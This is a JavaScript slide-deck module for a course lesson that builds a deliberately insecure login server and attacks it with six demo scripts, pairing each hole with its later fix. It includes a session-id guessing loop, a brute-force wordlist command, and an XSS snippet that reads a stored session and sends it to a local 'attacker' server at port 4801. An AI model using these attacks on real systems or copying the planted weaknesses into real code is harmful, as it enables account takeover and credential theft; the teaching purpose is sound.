/**
 * auth-00-3 — Authentication · Section 0 · Lesson 0.3 "A login that runs, and is wrong in six ways" (01/11/2026).
 * Slug bài: auth-0-3-dang-nhap-sai. Output = _ma.mjs của s00 (LabFlow ID v0 chạy thật, Node 22.23.3, env -i).
 */
import { lamDeck, js, sh, http, two, box, steps, cards, c } from './_auth-chung.mjs';
import { OUT, CODE } from '../../content/courses/authentication/s00/_ma.mjs';

export const deck = { key: 'auth-00-3', code: 'AUTH 0.3', title: 'A login that runs, and is wrong in six ways', sub: 'LabFlow ID v0 — the table of contents, as code' };

const body = (k) => OUT[k].split('\n').slice(1).join('\n');
const SV = CODE.server0.split('\n');

export const slides = lamDeck({ chuong: 'Section 0 — The problem, and a setup that runs', bai: '0.3' }, [
  { cover: true, t: 'A login that runs,<br>and is wrong in six ways', sub: 'Section 0 · Lesson 0.3 — LabFlow ID v0, attacked with real scripts' },
  { t: 'What you will take away from this lesson', to: true, giua: true, body: `<ul>
    <li>Set up <b>LabFlow ID</b> from an empty folder — Node 22, Express 5, no database server</li>
    <li>Drive a JSON API with ${c('curl')}: sign up, sign in, “who am I?”</li>
    <li>Run <b>six attack scripts</b> and read what each one proves</li>
    <li>The <b>roadmap</b>: which chapter fixes which hole</li>
    <li>Why the obvious one-line fix is usually <b>incomplete</b></li></ul>` },
  { t: 'Ten minutes to a running project', body: sh(OUT['03-cai-dat'].replace(/^\$ .*$/m, '$ node -v && npm -v && mkdir labflow-id && cd labflow-id && npm init -y …\n$ npm pkg set type=module && npm install --save-exact … express@5.3.0 && npm ls …'), { title: 'terminal — an empty folder', sm: false }) + steps([
      `${c('src/store.js')} — the “database”: one JSON file, ${c('data/db.json')} (PostgreSQL arrives in Chapter 2)`,
      `${c('src/server.js')} — sign-up, sign-in, ${c('/me')}: 39 lines`,
      `${c('scripts/seed.mjs')} — creates An, Bình (password ${c('123456')}) and Cô Lan through the real API`,
    ]) },
  { t: 'The 39 lines (the part that matters)', body: js(SV.slice(17, 35).join('\n'), { sm: true, hl: [5, 6, 7, 10, 11, 15] }) +
      box('Six “hole” comments', 'Every one is a chapter. Nothing here is a syntax error, a crash or a failing test.', 'lam') },
  { t: 'It works. That is the point.', body: sh(['$ npm run seed', OUT['03-seed'].split('\n').slice(5).join('\n'), OUT['03-an-dang-nhap'].replace(/^\$ .*$/m, "$ curl -s localhost:4800/sign-in --json '{…an@…, an-lab-2026}'; date +%H:%M"), OUT['03-me']].join('\n'), { title: 'npm run seed · sign in as An · GET /me', sm: false }) +
      box('Invisible from the outside', 'Every endpoint returns the right thing; a demo goes perfectly; a happy-path test passes. Authentication bugs are systems doing exactly what was written.', 'do2') },
  { t: 'Hole 1: the password is stored as typed', body: two(sh(OUT['03-db-mat-khau'].split('\n').slice(0, 13).join('\n') + '\n    …', { title: 'cat data/db.json' }),
      sh(OUT['03-db-mat-khau'].split('\n').slice(21).join('\n'), { title: '… the end of the same file' })) +
      two(box('Who can read it?', 'A leaked backup, a copied laptop, a curious teammate. Reused passwords open other sites too. → <b>Chapter 2</b>: argon2id', 'do2'), box('Bình never signed in', `The ${c('usr_2')} session was created by the attacker of hole 6.`, 'lam')) },
  { t: 'Hole 2: the error says which half was wrong', body: sh(body('03-do-email'), { title: 'node demo0/enumerate.mjs — six emails from someone else’s leak', sm: false }) +
      two(box('A free membership checker', '“Wrong password” = <b>this account exists</b>. The attacker now knows whose password to target.', 'do2'),
        box('OWASP: one generic message', '“Login failed; Invalid user ID or password” — and the same response time (Chapter 6).', 'xanh')) },
  { t: 'Hole 3: the session id is Date.now()', body: two(js(`const from = new Date().setHours(hh, mm, 0, 0);
async function worker() {
  while (!found && next < from + 60_000) {
    const guess = String(next++);
    const res = await fetch(BASE + '/me',
      { headers: { 'x-session': guess } });
    if (res.status === 200) found = …;
  }
}   // 32 workers in parallel`, { hl: [3, 4] }), `<div>${sh(OUT['03-doan-phien'].replace(' → {"id":"usr_1","email":"an@student.labflow.example","name":"Nguyen Van An"}', ' → An'), { title: 'the attacker knows only “12:59”' })}${box('≈ 16 bits', `60,000 ids in a minute ≈ 2<sup>16</sup>. OWASP floor: 64 bits. LabFlow ID from lesson 1.2: 256.`, 'xanh')}</div>`) + cards([
        ['Where “12:59” leaks', 'a “new sign-in” email, a log line, a screenshot, “last seen” on a profile'],
        ['Fix 1 — lesson 1.2', `256 bits from the OS random generator: ${c('newToken()')}`],
        ['Fix 2 — lesson 1.3', 'store only the SHA-256 of the id; look it up by digest'],
      ], 3) },
  { t: 'Hole 4: no expiry, no sign-out', body: sh(OUT['03-khong-dang-xuat'].replace("$ curl -s -o /dev/null -w '%{http_code}\\n' -X POST localhost:4800/sign-out -H 'x-session: 1793512776821'; curl -s -w '\\n' localhost:4800/me -H 'x-session: 1793512776821'", "$ curl … -X POST /sign-out …;  curl … /me -H 'x-session: 1793512776821'"), { title: 'try to sign out, then use the session again', sm: false }) +
      cards([
        ['No /sign-out', 'Express answers 404 — the route does not exist.'],
        ['No expiry', 'The stolen session from hole 3 works next month, next year.'],
        ['Fixed in', '<b>Chapter 3</b> (expiry, sign-out) and <b>Chapter 5</b> (sign out everywhere, device list).'],
      ], 3) },
  { t: 'Hole 5: a credential JavaScript can read', body: two(js(`// the app must keep x-session in JS:
await page.evaluate((s) =>
  localStorage.setItem('labflow.session', s), sid);
// one injected script is enough:
await page.evaluate(async () => {
  const s = localStorage.getItem('labflow.session');
  await fetch('http://127.0.0.1:4801/steal?s=' + s);
});`, { sm: true, hl: [4, 5] }),
      `<div>${sh([OUT['03-xss'], body('03-xss-evil-log')].join('\n'), { title: 'Chromium 156 · attacker server on :4801' })}${box('One script is enough', `An XSS bug, a compromised npm package, a bad extension.`, 'do2')}</div>`) + cards([
        ['Why JS holds it', `the browser never sends ${c('x-session')} by itself`],
        ['What the attacker got', 'the id — and the curl that followed answered as An'],
        ['The fix', `an ${c('HttpOnly')} cookie scripts cannot read (Ch3) — and the token debate (Ch4)`],
      ], 3) },
  { t: 'Hole 6: nothing limits attempts', body: sh([OUT['03-do-mk-binh'], OUT['03-do-mk-an']].join('\n'), { title: 'node demo0/brute.mjs <email> wordlists/10k-most-common.txt', sm: false }) +
      two(box('Bình: second try', `${c('123456')} is line 2 of a public list. An: 10,001 tries, 2,877 per second, <b>zero</b> 429s.`, 'do2'),
        box('Layers of defence', 'Slow hash (Ch2) · limits per account and IP (Ch10–11) · breached-password check (Ch2).', 'xanh')) },
  { t: 'Six holes, one roadmap', body: `<table class="t"><tr><th>Hole</th><th>Measured</th><th>Fixed in</th></tr>
    <tr><td>1 · password as typed</td><td>all three readable</td><td>Ch2 — argon2id</td></tr>
    <tr><td>2 · error says which half</td><td>3 of 6 emails confirmed</td><td>Ch6 — one message, one duration</td></tr>
    <tr><td>3 · id = Date.now()</td><td>36,839 guesses, 4.37 s</td><td><b>Ch1</b> — 256 random bits, store the hash</td></tr>
    <tr><td>4 · no expiry, no sign-out</td><td>/sign-out 404, session still valid</td><td>Ch3, Ch5</td></tr>
    <tr><td>5 · custom header ⇒ JS storage</td><td>a script read and sent it</td><td>Ch3, Ch4 — HttpOnly cookie</td></tr>
    <tr><td>6 · no attempt limit</td><td>10,001 tries in 3.48 s, no 429</td><td>Ch2, Ch10, Ch11</td></tr></table>` +
      box('Trap: one message fixes half of hole 2', 'The unknown email returns at once, the known one goes on to check the password. With a slow hash, the <b>time</b> tells what the message no longer does.', 'do2') },
  { t: 'Summary', to: true, giua: true, body: `<ul>
    <li>39 lines that sign up, sign in and pass every happy-path test</li>
    <li>Six holes, each <b>proven</b> by a script and real output</li>
    <li>Each hole is a chapter — Chapter 1 fixes hole 3 first</li>
    <li>One identical message closes the message leak, not the timing leak</li>
    <li>Next — Chapter 1: credentials, and the primitives underneath</li></ul>` },
]);
